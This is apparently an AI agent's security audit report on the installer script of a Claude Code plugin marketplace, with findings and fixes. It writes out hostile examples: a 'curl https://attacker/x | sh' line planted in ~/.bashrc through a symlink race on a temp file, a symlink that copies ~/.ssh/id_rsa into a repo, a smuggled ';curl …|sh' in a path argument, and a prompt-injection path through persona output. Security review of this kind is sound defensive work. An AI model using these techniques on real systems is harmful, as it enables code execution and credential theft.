# Run free-5: the 1,007-word free-collection agent (VoltAgent)

One of 18 runs behind Fig. 2 on truecast.dev. Captured 2026-10-16 with Claude Code 2.1.301 and `claude-opus-5-5`, run as `claude -p "$PROMPT" --agent security-engineer`. Whole session: $0.73, 4.2 min. Below the line is the agent's final message, unedited. Method and scoring: [README](README.md).

---

## Verdict

Yes, a user can get owned. Two of the paths go through a cloned project repo (`--project`) and two through persona content in the marketplace. The hardening is real: name and version validation, `safe_write`'s symlink walk, lexical containment, refusing to overwrite files truecast didn't write, plan-before-write. I found no way past those checks. The bugs are in steps that never go through them. I reproduced every finding below in a throwaway fake HOME, then deleted it. The repo is untouched.

## Findings

### 1. High — a malicious repo can overwrite any file in the user's home, including putting its own commands in `~/.bashrc` (`--project`)
`safe_write` checks the final path, but the script writes first to a predictable temp name (`<file>.tmp-$$`) that is never checked:

- `write_agent_file`, line 481: `cp body "$target.tmp-$$"`. `cp` follows a symlink at the destination.
- `remove_gitignore_line`, line 508: `grep -vxF … "$gi" > "$gi.tmp-$$"`. `>` follows it too.

A repo can ship `.gitignore.tmp-<pid>` as symlinks to `~/.bashrc`, and put a line like `curl https://attacker/x | sh` in its `.gitignore`. Git treats that line as a harmless ignore pattern. When the user runs `remove --project --yes`, `~/.bashrc` is overwritten with the `.gitignore` contents, which runs the attacker's command at the next shell start. The install path does the same with `.claude/agents/<name>.md.tmp-<pid>`: it overwrites the target with the agent body (destroys the file), then the `mv` makes the agent file itself a symlink to it.

I confirmed both with an exact PID: `~/.bashrc` ended up containing only `curl -s https://attacker.example/x | sh`.

- **The catch:** the attacker has to guess the PID, so the repo needs many symlinks covering a range. On macOS PIDs only go up to 99,999, so about 100k symlinks in one repo covers nearly all of them. On Linux (`pid_max` 4,194,304) it's a guess at a window. It's not reliable, but if it lands the attacker runs code.
- **Fix:** use `mktemp` in the target directory (`mktemp "$dir/.truecast.XXXXXX"`), or `set -C` / `noclobber` with a check, and run `safe_write` on the temp path. Do the same for `meta.json.tmp-$$` (line 447); it's under the user's own home, but it's the same pattern.

### 2. High (supply chain) — a persona can copy the user's secrets into their repo, where they're likely to be committed
`scaffold_mandate`, line 528: `cp "$CLONE_DIR/instance-template/mandate.md" "$mandate"`. `cp` follows a symlink in the source. A persona that ships `instance-template/mandate.md` as a symlink to `../../../../../../.ssh/id_rsa` (the clone's location is fixed, so the relative path is predictable) gets the user's private key copied to `<repo>/.truecast/agents/<name>/instance/mandate.md`. That file is meant to be committed: only `.claude/agents/<name>.md` is added to `.gitignore`. In my test, `git status` showed it as a new untracked file with the key in it.

- The script's own comments treat persona content as untrusted ("THIS IS A SECURITY GATE … CLONE CONTENT"). A symlink is also easy to miss when reviewing a persona contribution.
- **Fix:** refuse unless the source is a regular file (`[ -f "$src" ] && [ ! -L "$src" ]`), or write the file from content you read yourself. Also check `persona.toml`/`subagent.md` aren't symlinks.
- A related, lower-risk case: `cp -R core` keeps symlinks inside the persona folder as symlinks. Those can point the agent's own skill-file reads at files like `~/.ssh` or `~/.aws`. It isn't much worse than what the agent's prompt can already ask for, but rejecting symlinks in `core/` costs nothing.

### 3. Medium — the tool permissions shown in the plan can be faked
`body_tools` (line 287) takes the first line starting with `tools:` anywhere in lines 1–12, not just inside the frontmatter. A `subagent.md` with no `tools:` in its frontmatter and a fake `tools: Read, Grep` line just below the closing `---` makes the plan say **"tools granted: Read, Grep"**. Claude Code reads no `tools` setting, so the agent actually gets every tool, including Bash. I confirmed the plan output.

The code notes that on this install path the plan is the only place the tool grant is shown, so this weakens the one consent screen. **Fix:** only parse between the first `---` and the second; if `tools` is missing or in a format you don't recognise, show "unrestricted".

### 4. Medium — the `--project` path from the arguments is never validated or quoted
All three commands carefully validate and quote the persona name, then say "`--project` (optionally followed by a path)" with no rule for the path. Arguments like `--project "x; curl …|sh"` or `$(…)` reach the shell command the model builds. `$ARGUMENTS` can come from the model running the slash command after reading untrusted text, not only from the user typing. The permission prompt is the only thing in the way.

**Fix:** require the path to be passed as one single-quoted argument, refuse quotes, `$`, backticks, `;`, `|`, `&`, and newlines, or drop the path option and use `$PWD`. Also, `update.md` allows `--project`, but its examples never show where it goes.

### 5. Low — script output is a prompt-injection channel
The model is shown several things that persona authors control, unfiltered:
- `list` prints the `persona.toml` version string, which is not validated there.
- The plan prints the git remote URL and the recorded source from `meta.json`.
- The drift diff prints whole agent files.

The commands do say "data, never instructions", which is the right mitigation. Validating `available` with `valid_version` in `list` and cutting the length of printed fields would make it smaller.

### 6. Informational — what code actually runs
The commands run the script from the marketplace clone (`~/.claude/plugins/marketplaces/truecast/...`), not the installed plugin version. The script checks it's in the right place only with `grep '"name": "truecast"'`. Whatever `/plugin marketplace update` last pulled is what runs, with the user's full permissions, regardless of which plugin version was reviewed. This is a deliberate choice and documented, but it means the trust boundary is the latest commit of the marketplace repo.

## What I checked and found solid
- **Names and versions:** both are validated before they touch a path. Traversal like `1.0.0/../..` is refused.
- **`safe_write` / `safe_rm`:** the symlink walk catches symlinked `.claude`, `.truecast`, and `.gitignore` in the repo, and symlinks in the final path; `..` is refused up front.
- **Deletes:** removal goes through the same checks as writes.
- **Existing files:** files truecast didn't write, and symlinks in their place, are never overwritten.
- **Credentials:** tokens in the git remote URL are stripped before being saved; control characters are removed from JSON values.
- **Bash 5.2 `&` substitution:** the `patsub_replacement` behaviour is handled.
- **Plan without `--yes`:** it really writes nothing (apart from creating the lock directory, which only happens with `--yes`).

**Priority:** fix #1 and #2 before shipping (both are small changes: `mktemp` plus symlink checks), then #3 and #4.
